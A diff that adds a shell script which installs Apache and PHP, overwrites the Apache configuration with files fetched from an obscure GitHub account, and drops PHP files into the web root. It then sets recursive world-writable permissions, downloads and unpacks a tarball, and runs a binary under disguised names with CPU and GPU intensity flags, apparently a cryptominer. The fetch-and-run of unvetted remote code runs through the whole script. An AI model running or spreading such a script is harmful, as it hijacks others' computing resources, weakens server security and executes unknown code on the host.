@@ -1,0 +1,84 @@
+pkill -f linux84
+
+apt-get update
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+mkdir /mnt/disks/
+
+mkdir /mnt/disks/user/
+
+mkdir /mnt/disks/user/project/
+
+cd /mnt/disks/user/project/
+
+apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+apt-get install -y bc
+
+apt-get install -y curl
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+apt-get install -y httpie
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+apt-get purge -y nginx
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+apt-get install -y apache2
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+apt-get install -y software-properties-common
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+add-apt-repository ppa:ondrej/php -y
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+apt-get install -y php5.6
+
+cd /etc/apache2/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/apache2.conf
+
+cd /etc/apache2/sites-enabled/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
+
+service apache2 restart
+
+cd /var/www/html/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index.php
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googlelinux84.php
+
+rm -rf /var/www/html/index.html
+
+chmod 777 -R /var/www/html/
+
+cd /mnt/disks/user/project/
+
+chmod -R 777 ./
+
+cd /mnt/disks/user/project/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux2.tar.gz
+tar -xf ./linux2.tar.gz
+
+chmod -R 777 ./
+
+cd linux2
+
+pkill -f cpulimit
+
+cpulimit -e google84121274 -l 62 &> /dev/null &
+
+./linux84 --mode linux84 --cpu-intensity 84 --gpu-intensity-cblocks 84 --gpu-intensity-gblocks 84
